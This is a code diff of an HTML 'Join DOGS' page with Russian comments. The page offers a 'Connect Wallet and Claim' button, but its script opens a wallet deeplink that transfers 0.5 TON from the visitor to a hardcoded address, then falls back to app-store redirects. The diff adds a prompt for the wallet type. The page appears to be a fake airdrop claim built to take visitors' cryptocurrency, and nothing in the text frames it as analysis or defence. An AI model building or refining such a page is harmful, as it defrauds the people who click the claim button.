@@ -63,35 +63,45 @@
     <div class="container">
         <img src="./dogs.jpg" alt="Join DOGS" class="image">
         <h2>Connect your wallet</h2>
-        <button class="button-main" onclick="connectWallet()">Connect Wallet and Claim</button>
+        <button class="button-main" onclick="selectWallet()">Connect Wallet and Claim</button>
     </div>
 
     <script>
-        function connectWallet() {
+        function selectWallet() {
+            // Показать пользователю выбор кошелька
+            const wallet = prompt("Введите тип кошелька (например, 'Tonkeeper', 'AnotherWallet'):");
+
+            // Ваша сумма и UID
             const tonAmount = 0.5;
             const userUID = "QCwDpTnJclQCsiJ6cLqqhr97LWX4RklOAWr3eBBENsilJhM";
-            const deeplink = `tonkeeper://transfer/${userUID}?amount=${tonAmount * 1e9}`; // Deeplink для открытия приложения
+
+            let deeplink = '';
+
+            // Определите deeplink в зависимости от выбранного кошелька
+            if (wallet === 'Tonkeeper') {
+                deeplink = `tonkeeper://transfer?amount=${tonAmount * 1e9}&user_id=${userUID}`;
+            } else if (wallet === 'AnotherWallet') {
+                deeplink = `anotherwallet://transfer?amount=${tonAmount * 1e9}&user_id=${userUID}`;
+            } else {
+                alert('Unsupported wallet type.');
+                return;
+            }
 
             // Открытие deeplink
             window.location.href = deeplink;
 
             // Таймер для проверки, что приложение открывается
             setTimeout(() => {
-                // Проверяем пользовательское устройство
-                const userAgent = navigator.userAgent || navigator.vendor || window.opera;
-                
                 // Ссылки для установки приложения
-                const playStoreURL = 'https://play.google.com/store/apps/details?id=com.tonkeeper'; // Ссылка на установку приложения в Google Play
+                const playStoreURL = 'https://play.google.com/store/apps/details?id=com.yourapp'; // Ссылка на установку приложения в Google Play
                 const appStoreURL = 'https://apps.apple.com/app/idYOUR_APP_ID'; // Замените YOUR_APP_ID на идентификатор вашего приложения в App Store
 
-                if (/android/i.test(userAgent)) {
-                    // Перенаправляем на Google Play, если устройство Android
+                // Перенаправление на страницу установки приложения
+                if (/android/i.test(navigator.userAgent)) {
                     window.location.href = playStoreURL;
-                } else if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
-                    // Перенаправляем на App Store, если устройство iOS
+                } else if (/iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream) {
                     window.location.href = appStoreURL;
                 } else {
-                    // Для остальных случаев
                     alert('Please install the appropriate app from your app store.');
                 }
             }, 2000); // Задержка 2 секунды
